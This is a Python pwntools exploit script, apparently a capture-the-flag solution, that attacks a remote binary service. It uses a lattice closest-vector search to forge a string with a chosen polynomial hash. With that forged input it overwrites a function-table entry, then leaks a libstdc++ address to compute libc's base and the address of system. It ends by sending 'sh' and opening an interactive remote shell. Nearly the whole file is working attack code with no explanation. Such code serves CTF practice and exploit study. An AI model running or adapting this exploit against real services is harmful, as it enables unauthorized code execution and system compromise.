from pwn import *
import sage.all
from sage.modules.free_module_integer import IntegerLattice
import os
import sys

Q = 31337
P = 2**64
W = 31337
MIDDLE_LETTER = ord('n')


def poly_hash(a):
    if type(a) == str:
        a = a.encode()
    h = 0
    for el in a:
        h = (h * Q + el) % P
    return h


def string_for_target_hash(target: int, string_len: int = 200) -> bytes:
    known = [MIDDLE_LETTER] * string_len
    known_hash = poly_hash(known)
    L = IntegerLattice(
        [
            [W * Q ** (len(known) - i - 1)]
            + [1 if j == i else 0 for j in range(len(known))]
            for i in range(len(known))
        ]
        + [[W * P] + [0] * len(known)]
    )
    vector = L.approximate_closest_vector([W * (target - known_hash)] + [0] * len(known))
    print(vector)
    return bytes(k + v for k, v in zip(known, vector[1:]))


setvbuf_plt = 0x404000
memcmp_plt = 0x404008
cin_int_plt = 0x404010
libc_offset= 0x672870
system_offset = 0x000000000058740
puts_got = 0x4010C0
HOST = sys.argv[1]
PORT = 1717


def main():
    # io = process(
    #     [
    #         "docker",
    #         "run",
    #         "-i",
    #         "-v",
    #         f"{os.getcwd()}:/kek",
    #         "ubuntu@sha256:8a37d68f4f73ebf3d4efafbcf66379bf3728902a8038616808f04e34a9ab63ee",
    #         "/kek/a.out",
    #     ]
    # )
    io = remote(HOST, PORT)

    pause()
    io.sendline(b"10")
    io.sendline(b"a")
    io.sendline(b'0')
    s = string_for_target_hash(setvbuf_plt)
    s = b'nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnmnnnononnomnomnonpmnlnomoonnnonnponnonnmnonn'
    print(hex(poly_hash(s)))

    io.sendline(s)
    io.sendline(b"1")
    io.sendline(b'0 1 0 1')
    io.readline()
    io.sendline((p64(puts_got) * 3)[:-1])
    for _ in range(4):
        io.readline()

    libstdcpp_leak = u64(io.readline()[:-1].ljust(8, b'\x00'))
    print("LIBSTDC++ leak", hex(libstdcpp_leak))
    libc_base = libstdcpp_leak - libc_offset
    system = libc_base + system_offset
    print("LIBC base", hex(libc_base))
    # io.sendline(b'sh' + b'\x00' * 6 + p64(system) + p64(system))
    io.sendline(b'sh' + b'\x00' * 6 + (p64(system) * 2)[:-1])
    io.interactive()


if __name__ == "__main__":
    main()
